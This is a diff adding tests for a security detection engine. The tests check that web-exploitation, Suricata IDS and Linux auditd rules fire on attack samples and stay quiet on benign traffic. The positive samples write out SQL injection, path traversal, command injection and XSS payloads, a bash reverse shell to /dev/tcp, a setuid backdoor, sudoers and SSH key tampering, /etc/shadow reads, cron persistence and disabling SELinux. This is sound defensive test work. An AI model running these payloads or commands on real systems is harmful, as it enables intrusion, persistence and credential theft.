@@ -651,3 +651,105 @@ def test_phase3_benign_cloud_activity_stays_quiet():
     # a normal Okta session start / a mailbox read are not impersonation / delegation
     assert not p3(hits(vendor="okta", product="system-log", log_type="user.session.start"))
     assert not p3(hits(vendor="microsoft", product="o365", action="Get-MailboxPermission"))
+
+
+# ── Phase 4: Linux + Network (web-exploitation T1190, Suricata IDS, auditd) ───
+_PHASE4_IDS = {
+    "lo-web-sql-injection", "lo-web-path-traversal", "lo-web-command-injection",
+    "lo-web-xss", "lo-web-scanner-ua", "lo-web-webshell-access",
+    "lo-suricata-web-attack", "lo-suricata-trojan-c2", "lo-suricata-crypto-mining",
+    "lo-linux-reverse-shell",
+    "lo-linux-setuid-backdoor", "lo-linux-sudoers-tamper", "lo-linux-ssh-authorized-keys",
+    "lo-linux-shadow-access", "lo-linux-cron-persistence", "lo-linux-disable-security",
+}
+
+
+def test_engine_fires_phase4_network_web_rules():
+    """Each Phase 4 web-exploitation / IDS / Linux rule fires on its positive."""
+    eng = DetectionEngine(load_rules(RULES_DIR))
+
+    def hits(**kw):
+        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}
+
+    def web(req, **extra):
+        return dict(vendor="web", product="access", log_type="access", action="GET",
+                    message=req, raw={"request": req, **extra})
+
+    def lx(cmd):  # auditd EXECVE
+        return dict(vendor="linux", product="auditd", log_type="execve",
+                    action="process-create", message=cmd, raw={"type": "EXECVE"})
+
+    # Web exploitation (T1190 & co.) --------------------------------------------
+    assert "lo-web-sql-injection" in hits(**web(
+        "GET /item?id=1 UNION SELECT username,password FROM users HTTP/1.1"))
+    assert "lo-web-path-traversal" in hits(**web(
+        "GET /download?f=../../../../etc/passwd HTTP/1.1"))
+    assert "lo-web-command-injection" in hits(**web(
+        "GET /ping?host=8.8.8.8;cat /etc/passwd HTTP/1.1"))
+    assert "lo-web-xss" in hits(**web(
+        "GET /search?q=<script>document.cookie</script> HTTP/1.1"))
+    assert "lo-web-webshell-access" in hits(**web("GET /uploads/shell.php?cmd=id HTTP/1.1"))
+    # scanner fingerprint lives in the user-agent (raw)
+    assert "lo-web-scanner-ua" in hits(vendor="web", product="access", log_type="access",
+                                       action="GET", message="GET /login HTTP/1.1",
+                                       raw={"user_agent": "sqlmap/1.7.2#stable"})
+    # cross-source: same SQLi fires on a Zeek http event (log_type=http)
+    assert "lo-web-sql-injection" in hits(
+        vendor="zeek", product="http", log_type="http", action="200",
+        message="HTTP GET evil.test/item?id=1 union select null,null-- -",
+        raw={"uri": "/item?id=1 union select null,null-- -"})
+
+    # Suricata IDS passthrough --------------------------------------------------
+    assert "lo-suricata-web-attack" in hits(
+        vendor="suricata", product="eve", log_type="alert", severity="high",
+        raw={"alert": {"category": "Web Application Attack", "signature": "ET WEB_SPECIFIC ..."}})
+    assert "lo-suricata-trojan-c2" in hits(
+        vendor="suricata", product="eve", log_type="alert", severity="high",
+        raw={"alert": {"category": "A Network Trojan was Detected", "signature": "ET MALWARE ..."}})
+    assert "lo-suricata-crypto-mining" in hits(
+        vendor="suricata", product="eve", log_type="alert", severity="low",
+        raw={"alert": {"category": "Crypto Currency Mining Activity", "signature": "ET POLICY ..."}})
+
+    # Linux auditd --------------------------------------------------------------
+    assert "lo-linux-reverse-shell" in hits(**lx("bash -i >& /dev/tcp/10.0.0.9/4444 0>&1"))
+    assert "lo-linux-setuid-backdoor" in hits(**lx("chmod 4755 /tmp/rootbash"))
+    assert "lo-linux-sudoers-tamper" in hits(**lx("tee /etc/sudoers.d/backdoor"))
+    assert "lo-linux-ssh-authorized-keys" in hits(**lx("tee -a /home/svc/.ssh/authorized_keys"))
+    assert "lo-linux-shadow-access" in hits(**lx("cat /etc/shadow"))
+    assert "lo-linux-cron-persistence" in hits(**lx("cp /tmp/evil /etc/cron.d/backup"))
+    assert "lo-linux-disable-security" in hits(**lx("setenforce 0"))
+
+
+def test_phase4_benign_network_web_activity_stays_quiet():
+    """Benign web requests and Linux commands must not trip the Phase 4 rules."""
+    eng = DetectionEngine(load_rules(RULES_DIR))
+
+    def hits(**kw):
+        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}
+
+    def p4(ids):
+        return {i for i in ids if i in _PHASE4_IDS}
+
+    def web(req, **extra):
+        return dict(vendor="web", product="access", log_type="access", action="GET",
+                    message=req, raw={"request": req, **extra})
+
+    def lx(cmd):
+        return dict(vendor="linux", product="auditd", log_type="execve",
+                    action="process-create", message=cmd, raw={"type": "EXECVE"})
+
+    # ordinary web traffic trips nothing
+    assert not p4(hits(**web("GET /products?category=shoes&id=42 HTTP/1.1",
+                             user_agent="Mozilla/5.0 (Windows NT 10.0) Chrome/120")))
+    assert not p4(hits(**web("POST /api/v1/cart/add HTTP/1.1",
+                             user_agent="okhttp/4.9")))
+    # a benign Suricata alert category and a non-alert event are quiet
+    assert not p4(hits(vendor="suricata", product="eve", log_type="alert", severity="low",
+                       raw={"alert": {"category": "Not Suspicious Traffic"}}))
+    assert not p4(hits(vendor="suricata", product="eve", log_type="dns",
+                       raw={"dns": {"rrname": "example.com"}}))
+    # ordinary Linux commands trip nothing
+    assert not p4(hits(**lx("chmod 755 /var/www/index.html")))
+    assert not p4(hits(**lx("cat /etc/passwd")))
+    assert not p4(hits(**lx("ls -la /etc/cron.d")))
+    assert not p4(hits(**lx("bash -c 'systemctl status nginx'")))
